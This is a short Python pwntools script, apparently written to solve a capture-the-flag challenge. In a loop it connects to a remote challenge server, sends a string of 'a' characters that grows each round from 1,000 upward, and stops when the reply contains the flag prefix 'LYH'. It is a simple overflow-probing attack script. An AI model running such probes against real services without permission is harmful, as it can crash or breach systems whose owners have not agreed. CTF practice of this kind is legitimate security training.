from pwn import *
import json
import base64
import binascii
import codecs
import sys

def json_recv():
    line = r.recv()
    return line

def json_send(request):
    r.sendline(request)

stringggg ="a"*1000

while True:
    r = remote('chal.lyhc.cyberus.la', 51111)
    json_send(stringggg)
    j=json_recv()
    print(j)
    stringggg = stringggg+'a'
    if("LYH" in str(j)):
        break;